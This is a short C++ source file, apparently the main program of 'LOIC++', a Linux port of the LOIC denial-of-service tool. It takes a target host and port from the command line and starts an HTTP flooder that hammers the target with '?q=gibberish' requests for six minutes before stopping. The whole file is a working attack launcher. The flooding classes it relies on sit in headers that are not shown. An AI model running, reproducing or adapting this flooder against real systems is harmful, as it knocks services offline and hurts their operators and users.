//============================================================================
// Name        : LOIC++.cpp
// Author      : Ivan Nelson Togboa Cadri
// Version     :
// Copyright   : 
// Description : Linux c++ version oif LOIC
//============================================================================

#include "HTTPFlooder.h"
#include "XXPFlooder.h"

using namespace loic;

int main(int argc,char *argv [])
{

	if(argc <3)
	{
		std::cout<<argc<<std::endl;
		exit(0);
	}
	loic::HTTPFlooder * flood = new loic::HTTPFlooder(argv[1],argv[2],"?q=gibberish",true,0,2);
	flood->Start();

	boost::this_thread::sleep(boost::posix_time::seconds(360));

	flood->Stop();
	return 0;
}
